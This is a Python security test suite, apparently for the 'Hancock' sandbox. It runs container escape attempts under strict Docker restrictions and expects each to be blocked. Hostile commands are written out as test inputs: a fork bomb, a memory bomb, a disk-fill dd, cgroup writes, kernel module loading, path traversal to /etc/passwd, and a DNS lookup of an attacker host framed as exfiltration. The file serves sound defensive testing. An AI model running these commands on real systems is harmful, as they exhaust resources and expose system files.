"""
Hancock Sandbox Security Validation Suite — v0.5.0

Meta-sandbox testing framework: Validates that the Hancock sandbox
cannot be escaped through common container breakout techniques.

Test Categories:
1. Privilege Escalation (sudo, setuid, capabilities)
2. Container Breakout (Docker socket, /proc, /sys exploits)
3. Resource Exhaustion (fork bombs, memory bombs, CPU loops)
4. Network Escape (localhost access, egress filtering bypass)
5. File System Escape (path traversal, symlink attacks, bind mounts)

Each test MUST FAIL (sandbox should block all escape attempts).
If any test succeeds → CRITICAL SECURITY ISSUE.

Usage:
    python3 sandbox/tests/test_sandbox_security.py --all
    python3 sandbox/tests/test_sandbox_security.py --category priv-esc
    python3 sandbox/tests/test_sandbox_security.py --test docker-socket
"""

import subprocess
import sys
import time
import json
from pathlib import Path
from typing import Dict, List, Tuple
from datetime import datetime


class SandboxSecurityTester:
    """Hardened sandbox testing framework with escape attempt validation."""

    def __init__(self, sandbox_image: str = "hancock-sandbox:latest"):
        self.sandbox_image = sandbox_image
        self.results = []
        self.passed = 0
        self.failed = 0
        self.critical = 0

    def run_escape_test(
        self,
        name: str,
        description: str,
        command: List[str],
        expect_blocked: bool = True,
        severity: str = "HIGH"
    ) -> Dict:
        """
        Run an escape attempt test.

        Args:
            name: Test identifier
            description: What this test attempts to do
            command: Command to run inside sandbox
            expect_blocked: True if sandbox should block this (default)
            severity: CRITICAL, HIGH, MEDIUM, LOW

        Returns:
            Result dict with success/failure status
        """
        print(f"\n{'='*80}")
        print(f"Test: {name}")
        print(f"Description: {description}")
        print(f"Severity: {severity}")
        print(f"Command: {' '.join(command)}")
        print(f"Expected: {'BLOCKED' if expect_blocked else 'ALLOWED'}")
        print(f"{'='*80}")

        # Build Docker run command with MAXIMUM security restrictions
        docker_cmd = [
            "docker", "run", "--rm",
            # Resource limits (strict)
            "--cpus", "0.5",
            "--memory", "256m",
            "--pids-limit", "50",  # Prevent fork bombs
            # Security options
            "--security-opt", "no-new-privileges",
            "--cap-drop", "ALL",  # Drop all capabilities
            "--read-only",  # Read-only root filesystem
            "--tmpfs", "/tmp:rw,noexec,nosuid,size=50m",  # Temp dir with noexec
            # Network isolation
            "--network", "none",  # No network access at all
            # No privileged mode
            # No Docker socket mount
            # No /proc or /sys mounts beyond defaults
            self.sandbox_image,
        ] + command

        start_time = time.time()
        try:
            result = subprocess.run(
                docker_cmd,
                capture_output=True,
                text=True,
                timeout=10,  # Short timeout for escape attempts
            )

            elapsed = time.time() - start_time
            exit_code = result.returncode
            output = (result.stdout + result.stderr).strip()

            # Determine if escape was successful
            if expect_blocked:
                # Escape attempt should FAIL (non-zero exit or permission denied)
                escaped = (exit_code == 0 and "permission denied" not in output.lower())
                test_passed = not escaped
            else:
                # Command should succeed (e.g., basic functionality test)
                test_passed = (exit_code == 0)

            # Evaluate result
            if test_passed:
                status = "✅ PASS"
                self.passed += 1
            else:
                status = "❌ FAIL"
                self.failed += 1
                if severity == "CRITICAL" and not test_passed:
                    self.critical += 1

            result_dict = {
                "name": name,
                "description": description,
                "severity": severity,
                "command": " ".join(command),
                "exit_code": exit_code,
                "output": output[:500],  # Truncate long output
                "elapsed": round(elapsed, 3),
                "expected_blocked": expect_blocked,
                "test_passed": test_passed,
                "status": status,
            }

            print(f"{status} (exit {exit_code}, {elapsed:.2f}s)")
            if not test_passed:
                print(f"⚠️  OUTPUT: {output[:200]}")

            self.results.append(result_dict)
            return result_dict

        except subprocess.TimeoutExpired:
            print("⏱️  TIMEOUT (10s) — likely resource exhaustion attempt blocked")
            result_dict = {
                "name": name,
                "description": description,
                "severity": severity,
                "command": " ".join(command),
                "exit_code": -1,
                "output": "TIMEOUT",
                "elapsed": 10.0,
                "expected_blocked": expect_blocked,
                "test_passed": True,  # Timeout = blocked = good
                "status": "✅ PASS (timeout)",
            }
            self.passed += 1
            self.results.append(result_dict)
            return result_dict

        except Exception as e:
            print(f"❌ EXCEPTION: {e}")
            result_dict = {
                "name": name,
                "description": description,
                "severity": severity,
                "command": " ".join(command),
                "exit_code": -2,
                "output": str(e),
                "elapsed": 0,
                "expected_blocked": expect_blocked,
                "test_passed": False,
                "status": "❌ ERROR",
            }
            self.failed += 1
            self.results.append(result_dict)
            return result_dict

    def test_privilege_escalation(self):
        """Test privilege escalation attempts (should all be blocked)."""
        print("\n" + "="*80)
        print("CATEGORY: Privilege Escalation")
        print("="*80)

        # Test 1: sudo (should not exist or fail)
        self.run_escape_test(
            name="priv-esc-sudo",
            description="Attempt to use sudo for privilege escalation",
            command=["bash", "-c", "sudo whoami"],
            expect_blocked=True,
            severity="CRITICAL"
        )

        # Test 2: setuid binaries
        self.run_escape_test(
            name="priv-esc-setuid",
            description="Search for setuid binaries that could escalate privileges",
            command=["bash", "-c", "find / -perm -4000 2>/dev/null | head -5"],
            expect_blocked=True,  # Should find none or all dropped
            severity="HIGH"
        )

        # Test 3: Capabilities check
        self.run_escape_test(
            name="priv-esc-capabilities",
            description="Check if container has dangerous capabilities",
            command=["bash", "-c", "cat /proc/self/status | grep Cap"],
            expect_blocked=False,  # Should succeed but show no caps
            severity="HIGH"
        )

        # Test 4: Try to change user
        self.run_escape_test(
            name="priv-esc-su",
            description="Attempt to su to root",
            command=["bash", "-c", "su - root"],
            expect_blocked=True,
            severity="CRITICAL"
        )

    def test_container_breakout(self):
        """Test container breakout attempts (should all be blocked)."""
        print("\n" + "="*80)
        print("CATEGORY: Container Breakout")
        print("="*80)

        # Test 1: Docker socket access
        self.run_escape_test(
            name="breakout-docker-socket",
            description="Attempt to access Docker socket for container escape",
            command=["bash", "-c", "ls -la /var/run/docker.sock"],
            expect_blocked=True,
            severity="CRITICAL"
        )

        # Test 2: /proc mounts check
        self.run_escape_test(
            name="breakout-proc-mounts",
            description="Check /proc for dangerous mounts",
            command=["bash", "-c", "cat /proc/mounts | grep -E '(docker|overlay|aufs)'"],
            expect_blocked=False,  # Will show mounts but shouldn't be exploitable
            severity="MEDIUM"
        )

        # Test 3: cgroup escape attempt
        self.run_escape_test(
            name="breakout-cgroup",
            description="Attempt to modify cgroup settings for escape",
            command=["bash", "-c", "echo 1 > /sys/fs/cgroup/memory/cgroup.procs"],
            expect_blocked=True,
            severity="CRITICAL"
        )

        # Test 4: Kernel module loading
        self.run_escape_test(
            name="breakout-kernel-module",
            description="Attempt to load kernel module",
            command=["bash", "-c", "insmod /tmp/evil.ko"],
            expect_blocked=True,
            severity="CRITICAL"
        )

    def test_resource_exhaustion(self):
        """Test resource exhaustion attacks (should all be blocked/limited)."""
        print("\n" + "="*80)
        print("CATEGORY: Resource Exhaustion")
        print("="*80)

        # Test 1: Fork bomb (should hit pids-limit)
        self.run_escape_test(
            name="resource-fork-bomb",
            description="Attempt fork bomb to exhaust PIDs",
            command=["bash", "-c", ":(){ :|:& };:"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 2: Memory bomb
        self.run_escape_test(
            name="resource-memory-bomb",
            description="Attempt to allocate excessive memory",
            command=["bash", "-c", "python3 -c 'x=[0]*999999999'"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 3: CPU loop
        self.run_escape_test(
            name="resource-cpu-loop",
            description="Attempt infinite CPU loop",
            command=["bash", "-c", "while true; do :; done"],
            expect_blocked=True,  # Timeout should kill it
            severity="MEDIUM"
        )

        # Test 4: Disk fill
        self.run_escape_test(
            name="resource-disk-fill",
            description="Attempt to fill disk with large file",
            command=["bash", "-c", "dd if=/dev/zero of=/tmp/bigfile bs=1M count=1000"],
            expect_blocked=True,  # tmpfs size limit should block
            severity="MEDIUM"
        )

    def test_network_escape(self):
        """Test network-based escape attempts (should all be blocked)."""
        print("\n" + "="*80)
        print("CATEGORY: Network Escape")
        print("="*80)

        # Test 1: Outbound connection
        self.run_escape_test(
            name="network-outbound",
            description="Attempt outbound connection to external host",
            command=["bash", "-c", "curl http://example.com"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 2: Localhost access
        self.run_escape_test(
            name="network-localhost",
            description="Attempt to access localhost services",
            command=["bash", "-c", "curl http://127.0.0.1:8080"],
            expect_blocked=True,
            severity="MEDIUM"
        )

        # Test 3: DNS exfiltration
        self.run_escape_test(
            name="network-dns-exfil",
            description="Attempt DNS-based data exfiltration",
            command=["bash", "-c", "nslookup evil.attacker.com"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 4: Check network interfaces
        self.run_escape_test(
            name="network-interfaces",
            description="List network interfaces (should show only loopback)",
            command=["bash", "-c", "ip addr show"],
            expect_blocked=False,  # Should succeed but show isolated network
            severity="LOW"
        )

    def test_filesystem_escape(self):
        """Test file system escape attempts (should all be blocked)."""
        print("\n" + "="*80)
        print("CATEGORY: File System Escape")
        print("="*80)

        # Test 1: Path traversal
        self.run_escape_test(
            name="fs-path-traversal",
            description="Attempt to read host files via path traversal",
            command=["bash", "-c", "cat ../../../../etc/passwd"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 2: Write to root filesystem
        self.run_escape_test(
            name="fs-write-root",
            description="Attempt to write to read-only root filesystem",
            command=["bash", "-c", "echo evil > /etc/evil.txt"],
            expect_blocked=True,
            severity="HIGH"
        )

        # Test 3: Symlink attack
        self.run_escape_test(
            name="fs-symlink",
            description="Attempt symlink to escape container",
            command=["bash", "-c", "ln -s /host/etc/passwd /tmp/passwd"],
            expect_blocked=True,  # No /host mount
            severity="MEDIUM"
        )

        # Test 4: Mount new filesystem
        self.run_escape_test(
            name="fs-mount",
            description="Attempt to mount new filesystem",
            command=["bash", "-c", "mount -t tmpfs tmpfs /mnt"],
            expect_blocked=True,
            severity="HIGH"
        )

    def generate_report(self) -> str:
        """Generate security validation report."""
        report = f"""
{'='*80}
HANCOCK SANDBOX SECURITY VALIDATION REPORT
{'='*80}
Date: {datetime.utcnow().isoformat()}Z
Image: {self.sandbox_image}

SUMMARY
-------
Total Tests:     {len(self.results)}
Passed:          {self.passed} ✅
Failed:          {self.failed} ❌
Critical Issues: {self.critical} 🚨

SECURITY POSTURE: {"🔒 SECURE" if self.critical == 0 else "⚠️  VULNERABLE"}

{'='*80}
DETAILED RESULTS
{'='*80}
"""
        for r in self.results:
            report += f"""
Test: {r['name']}
Description: {r['description']}
Severity: {r['severity']}
Command: {r['command']}
Status: {r['status']}
Exit Code: {r['exit_code']}
Time: {r['elapsed']}s
Output: {r['output'][:100]}...
"""

        report += f"\n{'='*80}\n"

        if self.critical > 0:
            report += f"""
🚨 CRITICAL SECURITY ISSUES FOUND: {self.critical}
⚠️  DO NOT DEPLOY THIS SANDBOX IN PRODUCTION
⚠️  Review failed tests and harden configuration before use
"""
        else:
            report += """
✅ NO CRITICAL ISSUES FOUND
✅ Sandbox passed all escape attempt tests
✅ Safe for production deployment (with continued monitoring)
"""

        return report

    def run_all_tests(self):
        """Run complete security test suite."""
        print(f"""
{'='*80}
HANCOCK SANDBOX SECURITY VALIDATION SUITE
{'='*80}
Target Image: {self.sandbox_image}
Started: {datetime.utcnow().isoformat()}Z

Running comprehensive escape attempt tests...
Each test attempts to break out of the sandbox.
ALL tests should FAIL (sandbox blocks escape).
{'='*80}
""")

        # Run all test categories
        self.test_privilege_escalation()
        self.test_container_breakout()
        self.test_resource_exhaustion()
        self.test_network_escape()
        self.test_filesystem_escape()

        # Generate and print report
        report = self.generate_report()
        print(report)

        # Save report to file
        report_path = Path(__file__).parent / "validation" / "security_report.txt"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(report)
        print(f"\n📄 Full report saved to: {report_path}")

        # Save JSON results
        json_path = Path(__file__).parent / "validation" / "security_results.json"
        json_path.write_text(json.dumps(self.results, indent=2))
        print(f"📊 JSON results saved to: {json_path}")

        # Exit with failure if critical issues found
        if self.critical > 0:
            print(f"\n🚨 EXITING WITH FAILURE — {self.critical} critical issues found")
            sys.exit(1)
        else:
            print("\n✅ ALL TESTS PASSED — Sandbox is secure")
            sys.exit(0)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Hancock Sandbox Security Validation")
    parser.add_argument("--image", default="hancock-sandbox:latest", help="Sandbox image to test")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--category", choices=["priv-esc", "breakout", "resource", "network", "fs"], help="Run specific category")
    parser.add_argument("--test", help="Run specific test by name")

    args = parser.parse_args()

    tester = SandboxSecurityTester(sandbox_image=args.image)

    if args.all or (not args.category and not args.test):
        tester.run_all_tests()
    elif args.category:
        if args.category == "priv-esc":
            tester.test_privilege_escalation()
        elif args.category == "breakout":
            tester.test_container_breakout()
        elif args.category == "resource":
            tester.test_resource_exhaustion()
        elif args.category == "network":
            tester.test_network_escape()
        elif args.category == "fs":
            tester.test_filesystem_escape()
        print(tester.generate_report())
    else:
        print(f"Single test mode not yet implemented. Use --all or --category for now.")
        sys.exit(1)
